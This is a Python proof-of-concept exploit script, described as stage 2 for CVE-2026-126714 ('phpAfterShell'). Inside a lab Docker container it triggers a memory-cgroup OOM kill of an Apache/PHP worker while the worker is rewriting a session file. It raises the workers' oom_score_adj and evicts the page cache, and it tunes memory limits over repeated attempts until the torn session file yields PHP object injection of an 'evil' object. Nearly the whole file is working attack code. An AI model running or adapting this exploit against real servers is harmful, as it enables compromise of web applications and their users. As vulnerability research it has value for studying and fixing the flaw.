#!/usr/bin/env python3
"""
Stage 2 - real interruption POC for CVE-2026-126714 (phpAfterShell).

Creates the mixed session file the same way the bug does in production:
the RFC1867 upload-progress callback rewrites the session with pwrite(),
and the worker is killed *inside* that syscall so the inode keeps
R[0:k] || C[k:]. The kill is forced by a memcg OOM triggered while the
victim's own pwrite charges the (evicted) page-cache pages:

  memcg limit L = baseline + headroom
  headroom covers the victim's transient allocations (read buffer, decoded
  bio, R serialization) plus a target offset k_target; the pwrite re-charge
  of the evicted session pages exhausts the remaining headroom at k_target
  and the OOM killer picks the victim (oom_score_adj = +1000).

An evictor thread keeps the session file's page cache dropped while the
victim reads/serializes, so the overwrite phase charges again.

Feedback: measure the resulting k by diffing the file against the
reconstructed R, then adjust headroom by (k_target - k).
"""
from __future__ import annotations

import os
import re
import socket
import sys
import threading
import time

import lab

X_EST = 40_000_000            # conservative estimate of victim transient charge
CALIB_HEADROOM = 80_000_000   # first attempt: huge slack, sample the trace
MAX_ATTEMPTS = 40   # runner hardware is slower/noisier than a dev machine;
                    # worker recycling adds noise to the feedback
K_TARGET = lab.k_target()     # refreshed by main() after set_geometry


# ------------------------------------------------------------- oom victim

def boost_children() -> int:
    """Raise oom_score_adj to +500 on every apache child.

    The OOM must select a child (ideally the victim, the largest RSS) and
    never pid 1 / the master - a master death takes the whole container
    down. Must be re-run before the victim connection: workers recycle
    (MaxConnectionsPerChild) and children forked after the first boost
    would serve the victim unboosted.
    """
    n = 0
    for p in lab.sh(
        "for p in $(pgrep apache2); do "
        "[ \"$p\" != \"1\" ] && echo $p; done").split():
        try:
            if lab.set_oom_adj(int(p), 500):
                n += 1
        except ValueError:
            pass
    return n


# --------------------------------------------------------------- evictor

def evictor(path: str, stop: threading.Event) -> None:
    try:
        fd = os.open(path, os.O_RDONLY)
    except OSError:
        return
    while not stop.is_set():
        try:
            os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
        except OSError:
            pass
    try:
        os.close(fd)
    except OSError:
        pass


# ------------------------------------------------------------ classification

def extract_r_fields(data: bytes) -> tuple[int, int] | None:
    m = re.search(rb's:15:"bytes_processed";i:(\d+);s:4:"done"', data[:400])
    t = re.search(rb's:10:"start_time";i:(\d+);', data[:400])
    if not m or not t:
        return None
    return int(m.group(1)), int(t.group(1))


def classify(data: bytes, c: bytes) -> tuple[str, int | None]:
    """
    Locate k by reading the file itself.

    R contains a run of exactly LEN2 'G' bytes (the replacement filename).
    In the mixed file that run is truncated at k, because everything from
    k on comes from C (whose payload is 'A's / structured bytes, never G).
      - run absent        -> k < f (filename header never written)
      - run shorter       -> k = end of run          (the splice window)
      - run complete      -> k >= E'                 (too late / full R)
    """
    if not data:
        return "empty", None
    if data == c:
        return "early", 0
    hdr = f"s:{lab.LEN2}:\"".encode()
    gi = data.find(hdr)
    if gi < 0:
        # filename header not present: k landed before it; if the progress
        # record prefix is there, report the first divergence point.
        fields = extract_r_fields(data)
        if fields:
            rp = reconstruct_prefix(fields)
            for i in range(130, min(len(data), len(rp))):
                if data[i] != rp[i]:
                    return "early", i
        return "early", 0
    gs = gi + len(hdr)
    ge = gs
    while ge < len(data) and data[ge] == ord("G"):
        ge += 1
    if ge - gs == lab.LEN2:
        return "late", ge          # filename fully written: k >= E'
    return "mix", ge               # truncated run: k = ge (inside [f, E'])


def reconstruct_prefix(fields: tuple[int, int]) -> bytes:
    # r_prefix with the exact bp from the file; the start_time digits are
    # skipped by the caller's start offset, so lengths always match.
    return lab.r_prefix(bp=fields[0])


# ---------------------------------------------------------------- attempt

def attempt(headroom: int, port: int, container: str) -> dict:
    lab.restart_victim()
    lab.set_mem_limit(0)  # docker update keeps limits across restarts; reset
    sid = lab.sid_new()
    res = {"sid": sid, "headroom": headroom}

    carrier_sock, _ = lab.carrier_hold(sid)
    time.sleep(0.6)
    c0 = lab.sess_read(sid)
    if not c0.startswith(b"upload_progress_"):
        res["outcome"] = "no-carrier"
        carrier_sock.close()
        return res

    p_start = len(c0) + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
    e_off = lab.e_offset()
    payload = lab.build_payload(p_start, e_off)
    lab.store_bio(sid, payload)
    time.sleep(0.3)
    c = lab.sess_read(sid)
    try:
        lab.verify_c(c, p_start, e_off, payload)
    except AssertionError as e:
        res["outcome"] = f"verify-c-failed:{e}"
        carrier_sock.close()
        return res

    lab.sess_chmod(sid, "666")
    os.sync()

    # make every existing apache *child* a valid OOM candidate with +500,
    # so the victim (largest RSS among them) wins; pid 1 (the master) must
    # never be selected or the container dies. Re-run again right before
    # the victim connection: with worker recycling (MaxConnectionsPerChild)
    # children forked after this boost would serve the victim unboosted.
    res["adj_children"] = boost_children()

    b0 = lab.mem_current()
    limit = b0 + headroom
    lab.set_mem_limit(limit)
    res["b0"] = b0
    res["limit"] = limit

    stop = threading.Event()
    th = threading.Thread(target=evictor,
                          args=(lab.sess_path(sid), stop), daemon=True)
    th.start()

    # high-frequency sampler of the container's memory.current
    trace: list[int] = []
    sstop = threading.Event()

    def sample() -> None:
        while not sstop.is_set():
            try:
                trace.append(lab.mem_current())
            except OSError:
                pass

    sth = threading.Thread(target=sample, daemon=True)
    sth.start()

    repl_sock = None
    try:
        # workers may have recycled since the first boost - make sure the
        # children about to serve the victim are OOM candidates too
        res["adj_children"] = boost_children()
        repl_sock, _ = lab.replacement_hold(sid)
        # wait for the victim to die (RST/EOF) or time out (no OOM)
        repl_sock.settimeout(6)
        try:
            while repl_sock.recv(65536):
                pass
            res["conn"] = "closed"
        except (ConnectionResetError, socket.timeout, OSError) as e:
            res["conn"] = type(e).__name__
    finally:
        time.sleep(0.3)
        stop.set()
        th.join(timeout=2)
        sstop.set()
        sth.join(timeout=2)
    res["trace_max"] = max(trace) if trace else None
    res["samples"] = len(trace)

    data = lab.sess_read(sid)
    try:
        outcome, k = classify(data, c)
    except Exception as e:                     # container died mid-attempt
        res["outcome"] = f"classify-error:{type(e).__name__}"
        for s in (carrier_sock, repl_sock):
            if s:
                try:
                    s.close()
                except OSError:
                    pass
        return res
    res["outcome"] = outcome
    res["k"] = k
    res["file_len"] = len(data)

    try:
        rep = lab.consume(sid)
    except (ConnectionRefusedError, OSError) as e:
        res["outcome"] = "container-died"
        res["report"] = str(e)
        for s in (carrier_sock, repl_sock):
            if s:
                try:
                    s.close()
                except OSError:
                    pass
        return res
    res["report"] = rep
    evil = "evil" in (rep.get("objects") or {})
    res["hit"] = evil

    # keep the file for inspection
    try:
        with open(os.path.join(lab.BASE, "results",
                               f"stage2_{outcome}_{sid[:8]}.bin"), "wb") as f:
            f.write(data)
    except OSError:
        pass

    for s in (carrier_sock, repl_sock):
        if s:
            try:
                s.close()
            except OSError:
                pass
    time.sleep(0.3)
    return res


def r_len() -> int:
    """|R| = R's progress record + C's bio record (L1 + bio header + closer)."""
    return len(lab.r_prefix()) + lab.LEN2 + len(lab.r_suffix()) + lab.L1 + 17


def _main() -> int:
    global K_TARGET
    lab.set_geometry("small")   # local controller sets oom_score_adj itself
    K_TARGET = lab.k_target()
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8087
    lab.PORT = port
    headroom = X_EST + K_TARGET
    print(f"[*] target port {port}, k_target={K_TARGET}, "
          f"initial headroom={headroom}")

    calibrated = False
    for i in range(1, MAX_ATTEMPTS + 1):
        # first pass: calibration attempt with a huge limit (no OOM), used
        # to measure the victim's real transient charge from the trace.
        hr = CALIB_HEADROOM if not calibrated else headroom
        print(f"\n=== attempt {i} (headroom={hr}"
              f"{', calibration' if not calibrated else ''}) ===")
        res = attempt(hr, port, lab.CONTAINER)
        print(f"    { {k: v for k, v in res.items() if k not in ('report',)} }")
        if res.get("hit"):
            print(f"\n[+] HIT on attempt {i}: {res['report']}")
            print("=== STAGE2 RESULT: PASS (real OOM interruption -> "
                  "object injection) ===")
            return 0

        if not calibrated and res.get("trace_max") and res.get("b0"):
            # X_pwrite = peak - |R| (the pwrite re-charges exactly |R|
            # bytes of evicted/new page cache before the drop).
            rl = r_len()
            x_pwrite = res["trace_max"] - res["b0"] - rl
            if 0 < x_pwrite < CALIB_HEADROOM:
                headroom = x_pwrite + K_TARGET + 100_000
                calibrated = True
                print(f"[*] calibrated: trace_max={res['trace_max']} "
                      f"|R|={rl} X_pwrite={x_pwrite} "
                      f"-> headroom={headroom}")
                continue

        outcome = res.get("outcome")
        k = res.get("k")
        if outcome == "container-died":
            headroom += K_TARGET // 2          # master was selected: back off
        elif k is not None and outcome in ("early", "mix", "late"):
            headroom += (K_TARGET - k)
        elif outcome in ("no-carrier", "unknown", "empty"):
            headroom += K_TARGET // 2
        else:
            headroom += K_TARGET // 2
        headroom = max(headroom, 2_000_000)

    print("\n=== STAGE2 RESULT: FAIL (no hit within attempts) ===")
    return 2


def main() -> int:
    """Entry point that always leaves the container as it was found."""
    try:
        return _main()
    finally:
        # Stage 2 tightens the memory boundary and raises oom_score_adj on
        # the apache children; adj can never be lowered again without
        # CAP_SYS_RESOURCE. Restore the compose default (64m) and restart so
        # the next CI step (the remote exploit) gets a fresh, unpoisoned
        # container instead of OOM-ing instantly on a stale limit.
        # Cleanup must never mask the stage verdict: swallow errors here.
        try:
            lab.set_mem_limit(64 * 1024 * 1024)
        except Exception as e:
            print(f"[!] mem-limit restore failed: {e}")
        try:
            lab.restart_victim()
        except Exception as e:
            print(f"[!] victim restart failed: {e}")


if __name__ == "__main__":
    sys.exit(main())
